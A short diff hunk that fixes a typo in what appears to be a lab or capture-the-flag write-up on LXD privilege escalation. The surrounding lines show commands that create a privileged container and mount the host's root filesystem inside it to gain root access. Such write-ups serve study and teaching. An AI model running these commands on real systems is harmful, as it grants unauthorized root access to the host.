@@ -121,7 +121,7 @@ To start your first container, try: lxc launch ubuntu:18.04
 +--------+--------------+--------+-------------------------------+--------+--------+------------------------------+
 ```
 
-We are lucky, we already have and Alpine image in the machine (Very convenient), lets get root access:
+We are lucky, we already have an Alpine image in the machine (Very convenient), lets get root access:
 
 `lxc init Alpine pwned -c security.privileged=true`
 `lxc config device add pwned system disk source=/ path=/mnt/root recursive=true`
